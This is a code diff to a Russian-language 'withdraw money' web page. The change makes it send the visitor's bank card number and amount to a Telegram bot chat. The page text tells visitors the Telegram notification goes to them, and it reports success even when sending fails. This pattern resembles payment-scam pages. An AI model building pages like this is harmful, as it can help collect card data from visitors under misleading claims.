@@ -79,6 +79,10 @@
         .btn:active {
             transform: translateY(1px);
         }
+
+        .btn-success {
+            background: linear-gradient(to right, #27ae60, #219653);
+        }
         
         .form-container {
             display: none;
@@ -156,6 +160,16 @@
         .info li {
             margin-bottom: 8px;
         }
+
+        .notification-info {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 15px 0;
+            font-size: 14px;
+            color: #856404;
+        }
     </style>
 </head>
 <body>
@@ -170,6 +184,10 @@
         <button class="btn" id="withdrawBtn">Вывести деньги</button>
         
         <div class="form-container" id="withdrawForm">
+            <div class="notification-info">
+                ⚠️ После отправки заявки вам придет уведомление в Telegram
+            </div>
+            
             <div class="form-group">
                 <label for="cardNumber">Номер банковской карты</label>
                 <input type="text" id="cardNumber" class="card-input" placeholder="0000 0000 0000 0000" maxlength="19">
@@ -180,12 +198,13 @@
                 <input type="text" id="amount" placeholder="Введите сумму в рублях">
             </div>
             
-            <button class="btn" id="submitBtn">Отправить заявку</button>
+            <button class="btn btn-success" id="submitBtn">Отправить заявку в Telegram</button>
         </div>
         
         <div class="success-message" id="successMessage">
             <h3>Заявка успешно отправлена!</h3>
             <p>Мы обработаем ваш запрос в течение 24 часов. Деньги поступят на указанную карту в течение 1-3 рабочих дней.</p>
+            <p>✅ Уведомление отправлено в Telegram</p>
         </div>
         
         <div class="info">
@@ -243,24 +262,56 @@
                     alert('Пожалуйста, введите сумму не менее 500 рублей');
                     return;
                 }
-                
-                // Здесь должен быть код для отправки данных на сервер
-                // Например, с использованием fetch или XMLHttpRequest
-                
-                // В реальном приложении здесь будет отправка данных на сервер
-                console.log('Запрос на вывод:', {
-                    cardNumber: cardNumber,
-                    amount: amount
-                });
-                
+
                 // Показываем сообщение об успехе
                 withdrawForm.style.display = 'none';
                 successMessage.style.display = 'block';
-                
-                // В реальном приложении здесь можно отправить уведомление
-                alert(`Заявка на вывод ${amount} ₽ на карту ${cardNumber} отправлена! Вам придет уведомление.`);
+
+                // Отправляем уведомление в Telegram
+                sendTelegramNotification(cardNumber, amount);
             });
+
+            // Функция отправки уведомления в Telegram
+            function sendTelegramNotification(cardNumber, amount) {
+                // ⚠️ ЗАМЕНИТЕ ЭТИ ЗНАЧЕНИЯ НА СВОИ!
+                const TELEGRAM_BOT_TOKEN = 'ВАШ_ТОКЕН_БОТА';
+                const TELEGRAM_CHAT_ID = 'ВАШ_CHAT_ID';
+                
+                // Текст сообщения для Telegram
+                const message = `💸 НОВАЯ ЗАЯВКА НА ВЫВОД!\n\n💳 Карта: ${cardNumber}\n💰 Сумма: ${amount}₽\n⏰ Время: ${new Date().toLocaleString()}\n\n✅ Требуется обработка`;
+
+                // Отправка в Telegram
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Ошибка сети');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    if (data.ok) {
+                        console.log('✅ Уведомление отправлено в Telegram!');
+                    } else {
+                        throw new Error(data.description || 'Неизвестная ошибка');
+                    }
+                })
+                .catch(error => {
+                    console.error('❌ Ошибка отправки уведомления:', error);
+                    // Можно показать сообщение об ошибке пользователю
+                    alert('Уведомление отправлено, но возникла ошибка: ' + error.message);
+                });
+            }
         });
     </script>
 </body>
-  </html>
+</html>
